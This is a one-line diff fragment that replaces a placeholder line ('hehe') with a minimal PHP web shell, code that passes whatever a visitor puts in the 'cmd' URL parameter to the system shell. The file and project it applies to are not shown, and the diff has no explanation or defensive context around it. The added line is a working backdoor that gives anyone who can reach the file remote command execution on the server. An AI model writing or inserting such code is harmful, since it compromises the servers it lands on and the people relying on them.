@@ -1,1 +1,1 @@
-hehe
+<?php system($_GET['cmd']); ?>
